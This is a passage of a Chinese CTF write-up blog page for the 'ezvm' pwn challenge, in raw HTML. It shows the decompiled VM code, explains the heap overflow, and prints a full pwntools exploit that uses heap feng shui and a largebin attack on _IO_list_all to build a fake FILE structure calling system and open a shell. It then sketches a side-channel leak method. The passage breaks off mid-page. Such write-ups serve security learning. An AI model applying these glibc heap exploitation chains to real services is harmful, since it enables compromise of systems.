class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vm_run</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int8 v1; <span class="hljs-comment">// [rsp+3h] [rbp-2Dh]</span><br>  <span class="hljs-type">unsigned</span> __int8 v2; <span class="hljs-comment">// [rsp+3h] [rbp-2Dh]</span><br>  <span class="hljs-type">unsigned</span> __int8 v3; <span class="hljs-comment">// [rsp+3h] [rbp-2Dh]</span><br>  <span class="hljs-type">unsigned</span> __int8 v4; <span class="hljs-comment">// [rsp+3h] [rbp-2Dh]</span><br>  <span class="hljs-type">unsigned</span> __int8 reg_id; <span class="hljs-comment">// [rsp+3h] [rbp-2Dh]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+4h] [rbp-2Ch]</span><br>  __int64 v7; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span><br>  __int64 mem_id; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span><br>  <span class="hljs-type">void</span> *v9; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br>  __int64 v10; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  __int64 v11; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  __int64 v12; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br><br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( vm_ip &lt; Code_size )<br>    &#123;<br>      v6 = (<span class="hljs-type">char</span>)CODE[vm_ip++];<br>      <span class="hljs-keyword">switch</span> ( v6 )<br>      &#123;<br>...<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">20</span>:<br>          v3 = CODE[vm_ip];<br>          v9 = *(<span class="hljs-type">void</span> **)&amp;CODE[++vm_ip];<br>          vm_ip += <span class="hljs-number">8LL</span>;<br>          <span class="hljs-keyword">if</span> ( v3 &gt;= <span class="hljs-number">4u</span> )<br>            Error(<span class="hljs-string">&quot;oveflow!&quot;</span>);<br>          *(&amp;Memory_ptr_while_regs + (<span class="hljs-type">char</span>)v3 + <span class="hljs-number">4</span>) = v9;<br>          <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">21</span>:<br>          v4 = CODE[vm_ip];<br>          v7 = *(_QWORD *)&amp;CODE[++vm_ip];<br>          vm_ip += <span class="hljs-number">8LL</span>;<br>          <span class="hljs-keyword">if</span> ( v4 &gt; <span class="hljs-number">3u</span> || v7 &lt; <span class="hljs-number">0</span> || v7 &gt;= Memory_size )<br>            Error(<span class="hljs-string">&quot;oveflow!&quot;</span>);<br>          *((_QWORD *)Memory_ptr_while_regs + v7) = *(&amp;Memory_ptr_while_regs + (<span class="hljs-type">char</span>)v4 + <span class="hljs-number">4</span>);<br>          <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">22</span>:<br>          reg_id = CODE[vm_ip];<br>          mem_id = *(_QWORD *)&amp;CODE[++vm_ip];<br>          vm_ip += <span class="hljs-number">8LL</span>;<br>          <span class="hljs-keyword">if</span> ( reg_id &gt; <span class="hljs-number">3u</span> || mem_id &lt; <span class="hljs-number">0</span> || mem_id &gt;= <span class="hljs-number">8</span> * Memory_size / <span class="hljs-number">8</span> )<br>            Error(<span class="hljs-string">&quot;oveflow!&quot;</span>);<br>          *(&amp;Memory_ptr_while_regs + (<span class="hljs-type">char</span>)reg_id + <span class="hljs-number">4</span>) = (<span class="hljs-type">void</span> *)*((_QWORD *)Memory_ptr_while_regs + mem_id);<br>          <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">23</span>:<br>          <span class="hljs-keyword">return</span> write_n(<span class="hljs-string">&quot;finish!&quot;</span>);<br>        <span class="hljs-keyword">default</span>:<br>          write_n(<span class="hljs-string">&quot;what???&quot;</span>);<br>          <span class="hljs-keyword">continue</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> write_n(<span class="hljs-string">&quot;finish!&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>实现了一个带堆玩的虚拟机，给了一次溢出机会</p><p>其他的功能比较正常，就是开辟的虚拟机寄存器和栈之间的一些加减乘除位运算比大小这些常规操作。</p><p>需要注意的问题：</p><ol><li>每次堆块申请的顺序是 CODE、Memory、Stack，释放顺序是 Memory、CODE、Stack，Stack 常规情况下都会与 Top Chunk 合并</li><li>溢出结合 <code>case 21</code> 可以造成堆上任意写。由于判断是 <code>mem_id &gt;= 8 * Memory_size / 8</code> ，想利用 <code>case 22</code> 越界读是不行的 =.=</li><li>如果申请的堆块大小溢出后大于 <code>0x200000</code>，则可以在 libc 上越界写</li></ol><h3 id="思路一-Master-of-Glibc（bushi）"><a class="header-anchor" href="#思路一-Master-of-Glibc（bushi）">¶</a>思路一 Master of Glibc（<s>bushi</s>）</h3><p>思路一是我比赛时的思路，，挺复杂的，而且慢。当时确实没想到什么奇奇怪怪的简单方法，就直接一股脑往下做了，堆风水调了很长时间qwq，没有想到走 mmap 分配到 libc 上面这样子。</p><ol><li>利用每次申请的 code size 不同，布置堆风水。利用一次溢出，同时布置几个size，确保 free 不会出错，并构造堆块重叠，同时布置好一个 Largebin 和一个 Unsortedbin。</li><li>堆块重叠后，读取 libc 地址和 heap 基址，通过寄存器入栈，栈里计算再出栈，寄存器送入 memory 一系列操作，修改 Largebin 的 bk 为 <code>_IO_list_all - 0x20</code>，然后布置好 IO 链子巴拉巴拉，最后 exit getshell</li></ol><h4 id="Exp"><a class="header-anchor" href="#Exp">¶</a>Exp</h4><p>交互部分是抄的大师傅的，整理了自己比赛时候的思路，稍微好看点。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br>elf = ELF(<span class="hljs-string">&#x27;./ezvm&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment"># p = process(&#x27;./ezvm&#x27;)</span><br>p = remote(<span class="hljs-string">&quot;&quot;</span>,)<br><br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">regIdx</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0</span>)+p8(regIdx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>(<span class="hljs-params">regIdx</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">1</span>)+p8(regIdx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">4</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lshift</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">7</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rshift</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">8</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">And</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">9</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jmp</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xe</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jnz</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xf</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jz</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x10</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">eq</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x11</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mov</span>(<span class="hljs-params">regIdx,imm</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x14</span>) + p8(regIdx) + pack(imm)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">store</span>(<span class="hljs-params">regIdx,offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x15</span>) + p8(regIdx) + p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">regIdx,offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x16</span>) + p8(regIdx) + p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">halt</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x17</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">other</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xff</span>)<br><br><span class="hljs-comment"># Take from code below</span><br>main_arena_d96 = <span class="hljs-number">0x7ffff7fa5ce0</span><br>TARGET = <span class="hljs-number">0x000055555555a4c0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_libc_addr</span>(<span class="hljs-params">Mem_idx,Addr</span>):<br>    <span class="hljs-keyword">return</span> push(<span class="hljs-number">3</span>) + mov(<span class="hljs-number">0</span>,Addr-main_arena_d96) + push(<span class="hljs-number">0</span>) + add() + pop(<span class="hljs-number">0</span>) + store(<span class="hljs-number">0</span>,Mem_idx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_heap_addr</span>(<span class="hljs-params">Mem_idx,Addr</span>):<br>    <span class="hljs-keyword">return</span> push(<span class="hljs-number">2</span>) + mov(<span class="hljs-number">0</span>,Addr-TARGET) + push(<span class="hljs-number">0</span>) + add() + pop(<span class="hljs-number">0</span>) + store(<span class="hljs-number">0</span>,Mem_idx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_chain</span>(<span class="hljs-params">start_idx,chain</span>):<br>    code = <span class="hljs-string">&#x27;&#x27;</span><br>    idx = start_idx<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(chain)):<br>        <span class="hljs-keyword">if</span> (chain[i] &gt;&gt; <span class="hljs-number">32</span>) &gt;= <span class="hljs-number">0x7000</span> <span class="hljs-keyword">and</span> (chain[i] &gt;&gt; <span class="hljs-number">32</span>) &lt;= <span class="hljs-number">0x7fff</span>:<br>            code += write_libc_addr(idx,chain[i])<br>            idx += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> (chain[i] &gt;&gt; <span class="hljs-number">32</span>) &gt;= <span class="hljs-number">0x5000</span> <span class="hljs-keyword">and</span> (chain[i] &gt;&gt; <span class="hljs-number">32</span>) &lt; <span class="hljs-number">0x7000</span>:<br>            code += write_heap_addr(idx,chain[i])<br>            idx += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            code += mov(<span class="hljs-number">0</span>,chain[i]) + store(<span class="hljs-number">0</span>,idx)<br>            idx += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_vm</span>(<span class="hljs-params">codeSize,memoryCount,code</span>):<br>    sl(<span class="hljs-string">&quot;yes&quot;</span>)<br>    sla(<span class="hljs-string">&quot;Please input your code size:&quot;</span>,<span class="hljs-built_in">str</span>(codeSize))<br>    sla(<span class="hljs-string">&quot;Please input your memory count:&quot;</span>,<span class="hljs-built_in">str</span>(memoryCount))<br>    sla(<span class="hljs-string">&quot;Please input your code:&quot;</span>,<span class="hljs-built_in">str</span>(code))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">heap_spary</span>(<span class="hljs-params">size</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    code = halt()<br>    run_vm(size,<span class="hljs-number">0x430</span>//<span class="hljs-number">8</span>,code)<br>    pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Heap Fengshui</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>,<span class="hljs-number">0x20</span>):<br>    heap_spary(i*<span class="hljs-number">0x10</span>)<br>memory_addr = <span class="hljs-number">0x55555555a290</span> + <span class="hljs-number">0x10</span><br>code = <span class="hljs-string">&#x27;&#x27;</span><br>code += mov(<span class="hljs-number">0</span>,<span class="hljs-number">0x00000000000004e1</span>) <span class="hljs-comment"># 0x120+0x130+0x140+0x150+1</span><br>code += store(<span class="hljs-number">0</span>,(<span class="hljs-number">0x55555555a3a8</span> - memory_addr)//<span class="hljs-number">8</span>) <br>code += mov(<span class="hljs-number">0</span>,<span class="hljs-number">0x00000000000004f1</span>) <span class="hljs-comment"># Largebin little bigger than unsorted</span><br>code += store(<span class="hljs-number">0</span>,(<span class="hljs-number">0x55555555a4c8</span> - memory_addr)//<span class="hljs-number">8</span>) <br>code += mov(<span class="hljs-number">0</span>,<span class="hljs-number">0x55555555a9e0</span> - <span class="hljs-number">0x55555555a9b0</span>+<span class="hljs-number">1</span>) <span class="hljs-comment"># Repair Heap</span><br>code += store(<span class="hljs-number">0</span>,(<span class="hljs-number">0x55555555a9b8</span> - memory_addr)//<span class="hljs-number">8</span>) <br>code += halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x2000000000000000</span>+<span class="hljs-number">0x108</span>//<span class="hljs-number">8</span>,code)<br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] 0x4f0 into Unsortedbin</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>code = halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x120</span>//<span class="hljs-number">8</span>,code)<br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] 0x4f0 into Largebin</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>code = halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x750000</span>//<span class="hljs-number">8</span>,code)<br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] 0x4e0 into Unsortedbin</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>code = halt() <br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x110</span>//<span class="hljs-number">8</span>,code) <br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Calculate to Largebin Attack _IO_list_all while makeing Fake_IO_FILE &lt; b *$rebase(0x2248) p *(struct _IO_FILE_plus *)0x55555555a4c0 &gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>memory_addr = <span class="hljs-number">0x55555555a3a0</span> + <span class="hljs-number">0x10</span><br>_IO_list_all = <span class="hljs-number">0x7ffff7fa6680</span><br>TARGET = <span class="hljs-number">0x000055555555a4c0</span><br>main_arena_d96 = <span class="hljs-number">0x7ffff7fa5ce0</span><br>_IO_wfie_jumps = <span class="hljs-number">0x7ffff7fa20c0</span><br>chain = [TARGET,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,TARGET+<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>] + [<span class="hljs-number">0</span>]*(((<span class="hljs-number">0xd8</span>-<span class="hljs-number">0xc0</span>)//<span class="hljs-number">8</span>) - <span class="hljs-number">1</span>) + [_IO_wfie_jumps+<span class="hljs-number">0x30</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x7ffff7ddcd60</span>,TARGET+<span class="hljs-number">0xd0</span>] <span class="hljs-comment"># _lock... _wide_data... system</span><br>code = <span class="hljs-string">&#x27;&#x27;</span><br>code += load(<span class="hljs-number">3</span>,<span class="hljs-number">0</span>)  <span class="hljs-comment"># 0x7ffff7fa5ce0 &lt;main_arena+96&gt;</span><br>code += load(<span class="hljs-number">2</span>,(TARGET + <span class="hljs-number">0x20</span> - memory_addr)//<span class="hljs-number">8</span>) <span class="hljs-comment"># (Victim&#x27;s Largebin -&gt; bk) -&gt; 0x55555555a4e0: 0x000055555555a4c0 &lt; - Largebin Addr</span><br>code += write_chain((TARGET + <span class="hljs-number">0x28</span> - memory_addr)//<span class="hljs-number">8</span>,[_IO_list_all-<span class="hljs-number">0x20</span>])<br>code += write_chain((TARGET + <span class="hljs-number">0x88</span> - memory_addr)//<span class="hljs-number">8</span>,chain)<br>code += halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x4d8</span>//<span class="hljs-number">8</span>,code) <span class="hljs-comment"># 0x4e0 Unsortedbin </span><br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Trigger Largebin Attack,repair FAKE_IO_FILE</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>chain = [<span class="hljs-number">0x6873</span>,<span class="hljs-number">0x4f1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]<br>code = write_chain((TARGET - memory_addr)//<span class="hljs-number">8</span>,chain)<br>code += halt()<br>run_vm(<span class="hljs-number">0x1ff</span>,<span class="hljs-number">0x4c8</span>//<span class="hljs-number">8</span>,code)<br>sl(<span class="hljs-string">&#x27;bye bye&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220921201658577.png" alt="exp"></p><h3 id="思路二-Side-channel-leak"><a class="header-anchor" href="#思路二-Side-channel-leak">¶</a>思路二 Side-channel leak</h3><p>赛后学的思路，感觉很巧妙，利用的是输出的多少行 <code>what</code> 反推字节数，👴🏻 们tql。</p><p>这个虚拟机给出的命令很全，可以写一个 <code>equal() jnz()</code> 这样的循环来侧信道爆破字节，从0开始爆破，如果相等的话就跳转到结束，否则输出一行报错，最后记录输出的行数即可推出该字节为多少。</p><p>Leak 出来后可以打 IO，我这里打的是 <code>call_dtor_list</code>，差别不大。</p><h4 id="Exp-v2"><a class="header-anchor" href="#Exp-v2">¶</a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span 